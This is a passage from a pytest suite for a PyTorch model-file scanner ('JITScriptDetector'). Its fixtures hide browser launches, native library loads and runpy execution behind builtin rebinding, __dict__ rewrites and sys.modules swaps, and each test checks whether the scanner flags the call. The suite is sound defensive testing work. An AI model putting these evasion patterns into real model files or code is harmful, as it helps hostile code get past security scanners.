            "import builtins\nimport webbrowser as wb\noriginal = wb.open\n"
            "if condition:\n"
            "    class Holder:\n"
            f"        builtins.print = {class_value}\n"
            "wb.open = builtins.print\nwb.open('https://example.invalid')\n"
        )

        assert (("webbrowser.open", "S109") in high_risk) is expected
        assert (("webbrowser.open", "S109") in suppressed) is (not expected)

    @pytest.mark.parametrize(
        ("source", "expected_pattern"),
        [
            (
                b"import sys\nimport webbrowser as wb\nflag = len(sys.argv) > 1\n"
                b"original = wb.open\nwb.open = print\n"
                b"if flag:\n    setattr = print\n"
                b"setattr(wb, 'open', original)\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import sys, builtins\nimport webbrowser as wb\nflag = len(sys.argv) > 1\n"
                b"original = wb.open\nwb.open = print\n"
                b"if flag:\n    builtins.setattr = print\n"
                b"setattr(wb, 'open', original)\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import sys\nimport ctypes as c\nflag = len(sys.argv) > 1\n"
                b"original = c.CDLL\nc.CDLL = print\n"
                b"if flag:\n    dict = print\n"
                b"dict.__setitem__(c.__dict__, 'CDLL', original)\nc.CDLL('libpayload.so')\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_tracks_mutation_through_uncertain_helper(
        self,
        source: bytes,
        expected_pattern: str,
    ) -> None:
        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    @pytest.mark.parametrize(
        ("source", "unexpected_pattern"),
        [
            (
                b"import sys\nimport webbrowser as wb\nflag = len(sys.argv) > 1\nwb.open = print\n"
                b"if flag:\n    setattr = print\nelse:\n    setattr = print\n"
                b"setattr(wb, 'open', wb.open)\nwb.open('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import sys\nimport ctypes as c\nflag = len(sys.argv) > 1\nc.CDLL = print\n"
                b"if flag:\n    dict = print\nelse:\n    dict = print\n"
                b"dict.__setitem__(c.__dict__, 'CDLL', c.CDLL)\nc.CDLL('safe')\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_ignores_mutation_through_definitely_shadowed_helper(
        self,
        source: bytes,
        unexpected_pattern: str,
    ) -> None:
        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == unexpected_pattern for finding in findings
        )

    @pytest.mark.parametrize(
        ("helper_shadow", "safe_overwrite"),
        [
            (b"setattr = print", b"setattr(wb, 'open', print)"),
            (b"dict = print", b"dict.__setitem__(wb.__dict__, 'open', print)"),
        ],
    )
    def test_scan_model_does_not_trust_safe_write_through_uncertain_helper(
        self,
        helper_shadow: bytes,
        safe_overwrite: bytes,
    ) -> None:
        source = (
            b"import sys\nimport webbrowser as wb\nflag = len(sys.argv) > 1\n"
            b"if flag:\n    " + helper_shadow + b"\n" + safe_overwrite + b"\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_ignores_rebound_inherited_eager_builtin_alias(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xffimport builtins as bi\nimport webbrowser as wb\n"
            + padding
            + b"class Lazy:\n    @staticmethod\n    def list(values):\n        return values\n"
            b"bi = Lazy\noriginal = wb.open\nwb.open = print\n"
            b"(bi.list((opener := original) for _ in [0]), opener('safe'))\n" + padding
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_ignores_rebound_inherited_typed_alias(self) -> None:
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xffimport builtins as bi\nimport webbrowser as wb\n"
            + padding
            + b"class Holder:\n    open = print\nwb = Holder\noriginal = wb.open\nwb.open = print\n"
            b"(bi.list((opener := original) for _ in [0]), opener('safe'))\n" + padding
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_accepts_restored_original_builtin_print(self) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\n"
            b"original_print = builtins.print\n"
            b"builtins.print = input\n"
            b"builtins.print = original_print\n"
            b"wb.open = builtins.print\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_rejects_restored_mutated_builtin_print_alias(self) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\n"
            b"original = wb.open\nbuiltins.print = original\n"
            b"mutated_print = builtins.print\n"
            b"builtins.print = mutated_print\n"
            b"wb.open = builtins.print\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize("target", [b"(captured,)", b"[captured]"])
    def test_scan_model_rejects_destructured_rebind_of_safe_print_alias(self, target: bytes) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\n"
            b"captured = builtins.print\n" + target + b" = (wb.open,)\n"
            b"wb.open = captured\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "mutation",
        [
            b"builtins.print = input",
            b"builtins.__dict__['print'] = input",
            b"setattr(builtins, 'print', input)",
        ],
    )
    def test_scan_model_ignores_print_mutation_through_rebound_builtins_name(self, mutation: bytes) -> None:
        source = (
            b"import builtins\nimport builtins as bi\nimport webbrowser as wb\n"
            b"class Holder:\n    pass\n"
            b"builtins = Holder\n" + mutation + b"\nwb.open = bi.print\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "target",
        [
            b"builtins.print",
            b"builtins.__dict__['print']",
        ],
    )
    def test_scan_model_rejects_uncertain_mutated_builtin_print(self, target: bytes) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\n"
            b"original = wb.open\n"
            b"if condition:\n    " + target + b" = original\n"
            b"wb.open = builtins.print\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_rejects_dynamic_builtin_print_mapping_mutation(self) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\n"
            b"original = wb.open\nmember = 'print'\n"
            b"builtins.__dict__[member] = original\n"
            b"wb.open = builtins.print\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "mutation",
        [
            b"builtins.__dict__.update(updates)",
            b"builtins.__dict__ |= updates",
        ],
    )
    def test_scan_model_rejects_dynamic_builtin_print_mapping_update(self, mutation: bytes) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\n"
            b"original = wb.open\nupdates = {'print': original}\n"
            + mutation
            + b"\nwb.open = builtins.print\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "rebind",
        [
            b"if condition:\n    bi = Holder\n",
            b"from contextlib import nullcontext\nwith nullcontext(Holder) as bi:\n    pass\n",
            b"match Holder:\n    case bi:\n        pass\n",
            b"(bi := Holder)\n",
        ],
    )
    def test_scan_model_rejects_uncertain_rebound_builtins_alias(self, rebind: bytes) -> None:
        source = (
            b"import builtins as bi\nimport webbrowser as wb\n"
            b"class Holder:\n    print = input\n" + rebind + b"wb.open = bi.print\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_accepts_uncertain_builtin_to_builtin_alias_rebinding(self) -> None:
        source = (
            b"import builtins\nimport builtins as bi\nimport webbrowser as wb\n"
            b"if condition:\n    bi = builtins\n"
            b"wb.open = bi.print\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_keeps_maybe_dangerous_imported_callable_rebinding(self) -> None:
        source = (
            b"import webbrowser as wb\n"
            b"original = wb.open\n"
            b"wb.open = print\n"
            b"from webbrowser import open as opener\n"
            b"if condition:\n    opener = original\n"
            b"opener('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_keeps_dangerous_callable_across_uncertain_reimport(self) -> None:
        source = (
            b"from webbrowser import open as opener\n"
            b"import webbrowser as wb\n"
            b"wb.open = print\n"
            b"if condition:\n    from webbrowser import open as opener\n"
            b"opener('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "restore",
        [
            b"wb.open = original",
            b"wb.__dict__['open'] = original",
        ],
    )
    def test_scan_model_invalidates_safe_member_after_uncertain_restore(self, restore: bytes) -> None:
        source = (
            b"import webbrowser as wb\n"
            b"original = wb.open\n"
            b"wb.open = print\n"
            b"if condition:\n    " + restore + b"\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "safe_write",
        [
            b"wb.open = print",
            b"wb.__dict__['open'] = print",
        ],
    )
    def test_scan_model_preserves_safe_member_after_uncertain_safe_write(self, safe_write: bytes) -> None:
        source = b"import webbrowser as wb\nwb.open = print\nif condition:\n    " + safe_write + b"\nwb.open('safe')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_rejects_uncertain_member_write_after_branch_print_shadow(self) -> None:
        source = (
            b"import webbrowser as wb\nwb.open = print\n"
            b"if condition:\n    print = input\n    wb.open = print\n"
            b"wb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_accepts_branch_local_builtin_print_restoration(self) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\n"
            b"if condition:\n    print = input\n    print = builtins.print\n"
            b"wb.open = print\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "targets",
        [
            b"(print, wb.open)",
            b"[print, wb.open]",
            b"(print, wb.__dict__['open'])",
        ],
    )
    def test_scan_model_accepts_uncertain_destructured_safe_print_write(self, targets: bytes) -> None:
        source = (
            b"import webbrowser as wb\nwb.open = print\n"
            b"if condition:\n    " + targets + b" = (input, print)\n"
            b"wb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "target",
        [
            b"wb.open",
            b"wb.__dict__['open']",
        ],
    )
    def test_scan_model_accepts_branch_local_typed_member_restoration(self, target: bytes) -> None:
        source = (
            b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
            b"if condition:\n    " + target + b" = original\n    " + target + b" = print\n"
            b"wb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_accepts_safe_print_alias_assigned_on_every_branch(self) -> None:
        source = (
            b"import builtins\nimport webbrowser as wb\n"
            b"if condition:\n    captured = builtins.print\n"
            b"else:\n    captured = builtins.print\n"
            b"wb.open = captured\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_keeps_all_uncertain_imported_callable_identities(self) -> None:
        source = (
            b"from webbrowser import open as opener\n"
            b"from ctypes import CDLL as loader\n"
            b"import webbrowser as wb\nimport ctypes as c\n"
            b"wb.open = print\nc.CDLL = print\n"
            b"if condition:\n    opener = loader\n"
            b"opener('payload')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")
        patterns = {finding.pattern for finding in findings if finding.type == "code_execution_pattern"}

        assert "Web browser launch detected" in patterns
        assert "Native library loading detected" in patterns

    def test_scan_model_tracks_dict_setdefault_alias_for_typed_member_restore(self) -> None:
        source = (
            b"import webbrowser as wb\n"
            b"put = dict.setdefault\n"
            b"del wb.open\n"
            b"put(wb.__dict__, 'open', print)\n"
            b"wb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "restore",
        [
            b"class C:\n    wb.open = original\n    wb.open('https://example.invalid')\n    wb = object()\n",
            b"wb.__setattr__('open', original)\nwb.open('https://example.invalid')\n",
            b"object.__setattr__(wb, 'open', original)\nwb.open('https://example.invalid')\n",
            b"del wb.open\nwb.__dict__.setdefault('open', original)\nwb.open('https://example.invalid')\n",
        ],
    )
    def test_scan_model_keeps_typed_calls_after_order_sensitive_restores(self, restore: bytes) -> None:
        source = b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n" + restore

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_treats_comprehension_typed_write_as_conditional(self) -> None:
        source = (
            b"import webbrowser as wb\n"
            b"[wb.__dict__.update(open=print) for _ in values]\n"
            b"wb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("comprehension", "should_detect"),
        [
            (b"[wb.__dict__.update(open=print) for _ in [0]]", False),
            (b"[wb.__dict__.update(open=print) for _ in []]", True),
            (b"[wb.__dict__.update(open=print) for _ in [0] if False]", True),
        ],
    )
    def test_scan_model_replays_only_definitely_executed_comprehension_typed_write(
        self,
        comprehension: bytes,
        should_detect: bool,
    ) -> None:
        source = b"import webbrowser as wb\n" + comprehension + b"\nwb.open('https://example.invalid')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )
        assert detected is should_detect

    def test_scan_model_replays_definitely_executed_comprehension_runpy_write(self) -> None:
        source = b"import runpy as rp\n[rp.__dict__.update(run_path=print) for _ in [0]]\nrp.run_path('payload.py')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(("restored_attribute", "should_detect"), [(b"print", False), (b"input", True)])
    def test_scan_model_tracks_direct_builtin_print_restoration(
        self,
        restored_attribute: bytes,
        should_detect: bool,
    ) -> None:
        source = (
            b"import builtins, webbrowser as wb\nprint = object()\nprint = builtins."
            + restored_attribute
            + b"\nwb.open = print\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )
        assert detected is should_detect

    @pytest.mark.parametrize(
        "replacement",
        [
            b"sys.modules['webbrowser'] = replacement\n",
            b"sys.modules.update({'webbrowser': replacement})\n",
            b"sys.modules |= {'webbrowser': replacement}\n",
            b"sys.modules[module_name] = replacement\n",
            b"sys.modules.update(replacements)\n",
        ],
    )
    def test_scan_model_invalidates_typed_cache_after_sys_modules_replacement(self, replacement: bytes) -> None:
        source = (
            b"import webbrowser as wb, sys\noriginal = wb.open\nwb.open = print\n"
            b"replacement = type(sys)('webbrowser')\nreplacement.open = original\n"
            + replacement
            + b"import webbrowser as fresh\nfresh.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "replacement",
        [
            b"sys.modules['runpy'] = replacement\n",
            b"sys.modules.update({'runpy': replacement})\n",
            b"sys.modules.__setitem__('runpy', replacement)\n",
            b"sys.modules |= {'runpy': replacement}\n",
            b"sys.modules[module_name] = replacement\n",
            b"sys.modules.update(replacements)\n",
        ],
    )
    def test_scan_model_invalidates_runpy_cache_after_sys_modules_replacement(self, replacement: bytes) -> None:
        source = (
            b"import runpy as rp, sys\noriginal = rp.run_path\nrp.run_path = print\n"
            b"replacement = type(sys)('runpy')\nreplacement.run_path = original\n"
            + replacement
            + b"import runpy as fresh\nfresh.run_path('payload.py')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "mutation",
        [
            b"sys.modules.setdefault('runpy', replacement)\n",
            b"sys.modules['other'] = replacement\n",
            b"sys.modules.update({'other': replacement})\n",
        ],
    )
    def test_scan_model_preserves_runpy_cache_across_unrelated_sys_modules_write(self, mutation: bytes) -> None:
        source = (
            b"import runpy as rp, sys\nrp.run_path = print\n"
            b"replacement = type(sys)('runpy')\nreplacement.run_path = original\n"
            + mutation
            + b"import runpy as fresh\nfresh.run_path('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("middle", "should_detect"),
        [
            (b"wb.__dict__.update(**maybe_original)\n", True),
            (b"wb.__dict__[member_name] = original\n", True),
            (b"wb.__dict__.__setitem__(member_name, original)\n", True),
            (b"wb.__dict__ |= maybe_original\n", True),
            (b"wb.__dict__.update(other=original)\n", False),
        ],
    )
    def test_scan_model_invalidates_typed_delete_proof_after_mapping_update(
        self,
        middle: bytes,
        should_detect: bool,
    ) -> None:
        source = (
            b"import webbrowser as wb\noriginal = wb.open\ndel wb.open\n"
            + middle
            + b"wb.__dict__.setdefault('open', print)\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )
        assert detected is should_detect

    @pytest.mark.parametrize(
        ("middle", "should_detect"),
        [
            (b"rp.__dict__.update(**maybe_original)\n", True),
            (b"rp.__dict__[member_name] = original\n", True),
            (b"rp.__dict__.__setitem__(member_name, original)\n", True),
            (b"rp.__dict__ |= maybe_original\n", True),
            (b"rp.__dict__.update(other=original)\n", False),
        ],
    )
    def test_scan_model_invalidates_runpy_delete_proof_after_mapping_update(
        self,
        middle: bytes,
        should_detect: bool,
    ) -> None:
        source = (
            b"import runpy as rp\noriginal = rp.run_path\ndel rp.run_path\n"
            + middle
            + b"rp.__dict__.setdefault('run_path', print)\nrp.run_path('payload.py')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )
        assert detected is should_detect

    @pytest.mark.parametrize(
        ("expression", "should_detect"),
        [
            (b"(setattr(wb, 'open', print), wb.open('safe'))\n", False),
            (b"(wb.open('https://example.invalid'), setattr(wb, 'open', print))\n", True),
        ],
    )
    def test_scan_model_orders_typed_writes_and_calls_within_expression(
        self,
        expression: bytes,
        should_detect: bool,
    ) -> None:
        source = b"import webbrowser as wb\n" + expression

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )
        assert detected is should_detect

    @pytest.mark.parametrize(
        ("prefix", "assignment", "expected_pattern"),
        [
            (
                b"import webbrowser as module\n",
                b"module.open, print = print, eval\nmodule.open('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import runpy as module\n",
                b"module.run_path, print = print, eval\nmodule.run_path('safe')\n",
                "Dynamic module execution detected",
            ),
        ],
    )
    def test_scan_model_preserves_rhs_print_in_simultaneous_assignment(
        self,
        prefix: bytes,
        assignment: bytes,
        expected_pattern: str,
    ) -> None:
        findings = JITScriptDetector().scan_model(prefix + assignment, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    @pytest.mark.parametrize(
        "deletion",
        [
            b"delattr(wb, 'open')\n",
            b"wb.__delattr__('open')\n",
            b"object.__delattr__(wb, 'open')\n",
        ],
    )
    def test_scan_model_tracks_typed_delattr_before_setdefault_restore(self, deletion: bytes) -> None:
        source = (
            b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
            + deletion
            + b"wb.__dict__.setdefault('open', original)\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_ignores_shadowed_typed_delattr_before_setdefault(self) -> None:
        source = (
            b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
            b"delattr = lambda *args: None\ndelattr(wb, 'open')\n"
            b"wb.__dict__.setdefault('open', original)\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("prefix", "member", "expected_pattern"),
        [
            (b"import webbrowser as module\n", b"open", "Web browser launch detected"),
            (b"import runpy as module\n", b"run_path", "Dynamic module execution detected"),
        ],
    )
    def test_scan_model_tracks_mapping_clear_before_setdefault_restore(
        self,
        prefix: bytes,
        member: bytes,
        expected_pattern: str,
    ) -> None:
        source = (
            prefix
            + b"original = module."
            + member
            + b"\nmodule."
            + member
            + b" = print\nmodule.__dict__.clear()\nmodule.__dict__.setdefault('"
            + member
            + b"', original)\nmodule."
            + member
            + b"('payload')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    def test_scan_model_tracks_getattr_typed_mapping_restore(self) -> None:
        source = (
            b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
            b"getattr(wb, '__dict__')['open'] = original\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_ignores_shadowed_getattr_typed_mapping_restore(self) -> None:
        source = (
            b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
            b"getattr = lambda *_args: {}\ngetattr(wb, '__dict__')['open'] = original\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "middle",
        [
            b"wb.open('safe')\nwb.open = original\n",
            b"choice = 1 if flag else 2\nwb.open('safe')\n",
            b"[value for value in (wb.__dict__.update(open=print) or [1])]\nwb.open('safe')\n",
        ],
    )
    def test_scan_model_preserves_ordered_typed_safe_calls(self, middle: bytes) -> None:
        source = b"import webbrowser as wb\noriginal = wb.open\nwb.open = print\n" + middle

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("deletion", "should_detect"),
        [
            (b"flag and rp.__dict__.pop('run_path', None)\n", True),
            (b"flag and rp.__dict__.__delitem__('run_path')\n", True),
            (b"remove = rp.__dict__.pop\nflag and remove('run_path', None)\n", True),
            (b"flag and dict.pop(rp.__dict__, 'run_path', None)\n", True),
            (b"remove = dict.pop\nflag and remove(rp.__dict__, 'run_path', None)\n", True),
            (
                b"import builtins\nremove = builtins.dict.pop\nflag and remove(rp.__dict__, 'run_path', None)\n",
                True,
            ),
            (b"rp.__dict__.pop('run_path', None)\n", False),
        ],
    )
    def test_scan_model_requires_unconditional_delete_before_safe_setdefault(
        self,
        deletion: bytes,
        should_detect: bool,
    ) -> None:
        source = (
            b"import runpy as rp\nflag = False\n"
            + deletion
            + b"rp.__dict__.setdefault('run_path', print)\nrp.run_path('payload.py')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )
        assert detected is should_detect

    def test_scan_model_ignores_conditional_safe_setdefault_after_unconditional_delete(self) -> None:
        source = (
            b"import runpy as rp\nflag = False\n"
            b"rp.__dict__.pop('run_path', None)\n"
            b"flag and rp.__dict__.setdefault('run_path', print)\n"
            b"rp.run_path('payload.py')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            (b"import runpy as rp\nif False:\n    rp = object()\nrp.run_path = print\nrp.run_path('safe')\n"),
            (b"import runpy as rp\nrp.run_path = print\nimport runpy as other\nrp.run_path('safe')\n"),
            (
                b"import runpy as rp\nrp.run_path = print\n"
                b"class Safe:\n    @staticmethod\n    def reload(value):\n        pass\n"
                b"Safe.reload(rp)\nrp.run_path('safe')\n"
            ),
            (
                b"import runpy\nfrom importlib import reload as refresh\nrunpy.run_path = print\n"
                b"(refresh := print)\nrefresh(runpy)\nrunpy.run_path('safe')\n"
            ),
            (
                b"import runpy\nfrom importlib import reload as refresh\nrunpy.run_path = print\n"
                b"for refresh in [print]:\n    pass\nrefresh(runpy)\nrunpy.run_path('safe')\n"
            ),
            (
                b"import runpy\nfrom importlib import reload as refresh\nrunpy.run_path = print\n"
                b"((refresh := print), refresh(runpy))\nrunpy.run_path('safe')\n"
            ),
            (
                b"import runpy, sys, types\nrunpy.run_path = print\n"
                b"sys = types.SimpleNamespace(modules={})\nsys.modules.pop('runpy', None)\n"
                b"import runpy\nrunpy.run_path('safe')\n"
            ),
            (
                b"import runpy, importlib, types\nrunpy.run_path = print\n"
                b"importlib = types.SimpleNamespace(reload=print)\n"
                b"importlib.reload(runpy)\nrunpy.run_path('safe')\n"
            ),
            (
                b"import runpy, importlib\nrefresh = print\nrunpy.run_path = print\n"
                b"(False and (refresh := importlib.reload), refresh(runpy))\nrunpy.run_path('safe')\n"
            ),
            (
                b"import runpy as rp, types\nrp.run_path = print\n"
                b"((rp := types.SimpleNamespace(run_path=print)), rp.run_path('safe'))\n"
            ),
            (b"import runpy as rp, types\n(rp := types.SimpleNamespace(run_path=print))\nrp.run_path('safe')\n"),
            (b"import runpy as rp, types\n[(rp := types.SimpleNamespace(run_path=print)), rp.run_path('safe')]\n"),
            (
                b"import runpy, sys, types\nrunpy.run_path = print\ns = sys\n"
                b"((s := types.SimpleNamespace(modules={})), s.modules.pop('runpy', None))\n"
                b"import runpy\nrunpy.run_path('safe')\n"
            ),
            (
                b"import runpy, importlib\nrefresh = importlib.reload\nrunpy.run_path = print\n"
                b"list((refresh := print) for _ in [1])\nrefresh(runpy)\nrunpy.run_path('safe')\n"
            ),
        ],
    )
    def test_scan_model_preserves_safe_runpy_state_across_benign_replay_edges(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("source", "expected_pattern"),
        [
            (
